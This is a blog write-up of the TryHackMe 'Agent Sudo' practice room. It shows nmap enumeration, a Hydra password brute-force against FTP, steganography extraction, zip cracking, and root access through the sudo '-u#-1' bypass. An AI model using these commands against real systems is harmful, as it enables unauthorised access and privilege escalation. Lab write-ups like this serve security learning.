---
layout: post
title: Agent Sudo
date: 2020-08-03 00:00:00 +5:30
description: The Following Post is writeup of smag grotto room of tryhackme # Add post description (optional)
img: smaggroto.png # Add image post (optional)
tags: [tryhackme, CTF, Sudo, CVE, Hashcracking, Steganography] # add tag
---

## Description:

The Following Post is writeup of Agent Sudo room of tryhackme <https://tryhackme.com/room/agentsudoctf>

|Machine|Details
|:---|:--
|OS | linux
|Rating | Easy
|Creator | DesKel

## Summary:

  PortScan will give you 3 open ports 21,22 and 80. When we go to port 80 we can see a message to change useragent
  we changed it to C and boom landed upon secret page. From here we logged into ftp and extracted some files. Zip Crack and
  Steganography all the way. Now we have another username and password. Now sudo exploit.

## Walkthrough:

### Enumeration
Lets start with nmap scan

```terminal
└──╼ $nmap -sC -sV -A -T4 10.10.144.201 -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 10:22 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Initiating Ping Scan at 10:22
Scanning 10.10.144.201 [2 ports]
Completed Ping Scan at 10:22, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:22
Completed Parallel DNS resolution of 1 host. at 10:22, 0.10s elapsed
Initiating Connect Scan at 10:22
Scanning 10.10.144.201 [1000 ports]
Discovered open port 21/tcp on 10.10.144.201
Discovered open port 80/tcp on 10.10.144.201
Discovered open port 22/tcp on 10.10.144.201
Increasing send delay for 10.10.144.201 from 0 to 5 due to 47 out of 117 dropped probes since last increase.
Completed Connect Scan at 10:22, 14.29s elapsed (1000 total ports)
Initiating Service scan at 10:22
Scanning 3 services on 10.10.144.201
Completed Service scan at 10:22, 6.46s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.144.201.
Initiating NSE at 10:22
Completed NSE at 10:22, 7.03s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.96s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Nmap scan report for 10.10.144.201
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Initiating NSE at 10:22
Completed NSE at 10:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.66 seconds
```
Start our enum for port 80

>Dear agents,

>Use your own codename as user-agent to access the site.

>From,<br/>
>Agent R

>try user agent C

#### Secret Page

>Attention chris,

>o you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

>From,<br/>
>Agent R



So indeed the password is weak let's brute force ssh or ftp

I tried both but got success in vsftpd

```terminal
└──╼ $hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.144.201
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-02 10:28:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.144.201:21/
[21][ftp] host: 10.10.144.201   login: chris   password: <redacted>
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-02 10:30:02
```
```terminal
Let's check files

-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```
cat To_agentJ.txt

>Dear agent J,

>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

>From,
Agent C

Another message<br/>
Let's check for Steganography

Binwalk
```terminal
└──╼ $binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Use john to crack the zip pass then we will get a Message

>Agent C,

>We need to send the picture to 'QXJ.....' as soon as possible!

>By,
Agent R

Hmmmm interesting let's check where we can put this password
I pretty much stuck but after a thought i got it
```terminal
└──╼ $base64 -d rand.txt
<redacted>
```
hahha worked and got message.txt

>Hi james,

>Glad you find this message. Your login password is hackerrules!

>Don't ask me why the password look cheesy, ask agent R who set this password for you.

>Your buddy
chris

For real i stuck a bit here and ran exploit suggester but got nothing
Then I feel noob when i ran this and my mind sudenly hit
```terminal
james@agent-sudo:/tmp$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
Yup sudo exploit

```terminal
james@agent-sudo:/tmp$ sudo -u#-1 /bin/bash
root@agent-sudo:/tmp#
```

Damn Good Rooted

>To Mr.hacker,

>Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

>Your flag is
<redacted>

>By,
<redacted> a.k.a Agent R
